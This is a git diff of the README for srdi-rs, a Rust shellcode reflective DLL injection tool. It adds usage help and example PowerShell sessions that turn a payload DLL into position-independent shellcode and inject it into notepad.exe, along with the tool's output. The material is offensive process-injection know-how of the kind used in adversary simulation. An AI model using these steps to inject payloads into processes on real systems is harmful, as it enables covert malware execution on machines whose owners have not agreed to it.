@@ -1,5 +1,7 @@
 # Shellcode Reflective DLL Injection (sRDI)
 
+The reflective loader is under 4KB in size.
+
 ## Description
 
 Shellcode reflective DLL injection (sRDI) is a process injection technique that allows us to convert a given DLL into a position-independent code which can then be injected using our favourite shellcode injection and execution technique.
@@ -34,11 +36,89 @@ Options:
 PS C:\Users\memN0ps\Documents\GitHub\srdi-rs\target\release>
 ```
 
-3). Bring your own injector (BYOI) and inject the position-independent code with your favourite injection and execution technique.
+3). Bring your own injector (BYOI) and inject the position-independent code with your favourite injection and execution technique or use the one in the repository.
 
 ```
-inject.exe <process> <shellcode.bin>
+PS C:\Users\memN0ps\Documents\GitHub\srdi-rs\target\release> .\inject.exe -h
+Simple Injector for PoC
+
+Usage: inject.exe --process <PROCESS> --file <FILE>
+
+Options:
+      --process <PROCESS>  The target process name (notepad.exe)
+      --file <FILE>        The PIC file path (shellcode.bin)
+  -h, --help               Print help
+  -V, --version            Print version
+PS C:\Users\memN0ps\Documents\GitHub\srdi-rs\target\release>
 ```
+
+## Example
+
+```
+PS C:\Users\memN0ps\Documents\GitHub\srdi-rs> cargo build --release
+    Finished release [optimized] target(s) in 0.04s
+PS C:\Users\memN0ps\Documents\GitHub\srdi-rs>
+```
+
+### DLLMain
+
+```
+PS C:\Users\memN0ps\Documents\GitHub\srdi-rs\target\release> .\generate_shellcode.exe --loader .\reflective_loader.dll --payload .\payload.dll --function SayHello --parameter https://127.0.0.1:1337/ --flags 0 --output shellcode.bin
+
+Loader Path: .\reflective_loader.dll
+Payload Path: .\payload.dll
+Output Path: shellcode.bin
+[+] Reflective Loader Offset: 0x400
+[!] Bootstrap Shellcode Length: 79 (Ensure this matches BOOTSTRAP_TOTAL_LENGTH in the code)
+[+] Reflective Loader Length: 3584
+[+] Payload DLL Length: 113664
+[+] Total Shellcode Length: 117350
+[*] loader(payload_dll: *mut c_void, function_hash: u32, user_data: *mut c_void, user_data_len: u32, _shellcode_bin: *mut c_void, _flags: u32)
+[*] arg1: rcx, arg2: rdx, arg3: r8, arg4: r9, arg5: [rsp + 0x20], arg6: [rsp + 0x28]
+[*] rcx: 0xe4a rdx: 0x756de3c6 r8: https://127.0.0.1:1337/, r9: 0x17, arg5: ???, arg6: 0
+PS C:\Users\memN0ps\Documents\GitHub\srdi-rs\target\release>
+```
+
+```
+PS C:\Users\memN0ps\Documents\GitHub\srdi-rs\target\release> .\inject.exe --process notepad.exe --file .\shellcode.bin
+
+[+] Process ID: 9944
+[+] Process handle: 184
+[+] Allocated memory in the target process for the shellcode: 0x19e49950000
+PS C:\Users\memN0ps\Documents\GitHub\srdi-rs\target\release>
+```
+
+![./ExampleDllMain.png](./ExampleDllMain.png)
+
+
+### SayHello
+
+```
+PS C:\Users\memN0ps\Documents\GitHub\srdi-rs\target\release> .\generate_shellcode.exe --loader .\reflective_loader.dll --payload .\payload.dll --function SayHello --parameter https://127.0.0.1:1337/ --flags 1 --output shellcode.bin
+
+Loader Path: .\reflective_loader.dll
+Payload Path: .\payload.dll
+Output Path: shellcode.bin
+[+] Reflective Loader Offset: 0x400
+[!] Bootstrap Shellcode Length: 79 (Ensure this matches BOOTSTRAP_TOTAL_LENGTH in the code)
+[+] Reflective Loader Length: 3584
+[+] Payload DLL Length: 113664
+[+] Total Shellcode Length: 117350
+[*] loader(payload_dll: *mut c_void, function_hash: u32, user_data: *mut c_void, user_data_len: u32, _shellcode_bin: *mut c_void, _flags: u32)
+[*] arg1: rcx, arg2: rdx, arg3: r8, arg4: r9, arg5: [rsp + 0x20], arg6: [rsp + 0x28]
+[*] rcx: 0xe4a rdx: 0x756de3c6 r8: https://127.0.0.1:1337/, r9: 0x17, arg5: shellcode.bin addy, arg6: 1
+PS C:\Users\memN0ps\Documents\GitHub\srdi-rs\target\release>
+```
+
+```
+PS C:\Users\memN0ps\Documents\GitHub\srdi-rs\target\release> .\inject.exe --process notepad.exe --file .\shellcode.bin
+[+] Process ID: 9944
+[+] Process handle: 184
+[+] Allocated memory in the target process for the shellcode: 0x19e499c0000
+PS C:\Users\memN0ps\Documents\GitHub\srdi-rs\target\release>
+```
+
+![./ExampleSayHello.png](./ExampleSayHello.png)
 
 ## Description
 
@@ -76,30 +156,11 @@ nop
 nop
 ```
 
+The shellcode.bin file layout in memory:
+
 [![sRDI](./sRDI.png)](https://www.netspi.com/blog/technical/adversary-simulation/srdi-shellcode-reflective-dll-injection/)
 
 **Credits: [Nick Landers @(monoxgas)](https://github.com/monoxgas)**
-
-## Example
-
-```
-PS C:\Users\memN0ps\Documents\GitHub\srdi-rs\target\release> .\generate_shellcode.exe --loader .\reflective_loader.dll --payload .\payload.dll --function SayHello --parameter https://127.0.0.1:1337/ --flags 0 --output shellcode.bin
-Loader Path: .\reflective_loader.dll
-Payload Path: .\payload.dll
-Output Path: shellcode.bin
-[+] Reflective Loader Offset: 0x400
-[!] Bootstrap Shellcode Length: 79 (Ensure this matches BOOTSTRAP_TOTAL_LENGTH in the code)
-[+] Reflective Loader Length: 3584
-[+] Payload DLL Length: 113664
-[+] Total Shellcode Length: 117350
-[*] loader(payload_dll: *mut c_void, function_hash: u32, user_data: *mut c_void, user_data_len: u32, _shellcode_bin: *mut c_void, _flags: u32)
-[*] arg1: rcx, arg2: rdx, arg3: r8, arg4: r9, arg5: [rsp + 0x20], arg6: [rsp + 0x28]
-[*] rcx: 0xe4a rdx: 0x756de3c6 r8: https://127.0.0.1:1337/, r9: 0x17, arg5: ???, arg6: 0
-```
-
-```
-.\inject.exe --process notepad.exe --file .\shellcode.bin
-```
 
 ## References and Credits
 
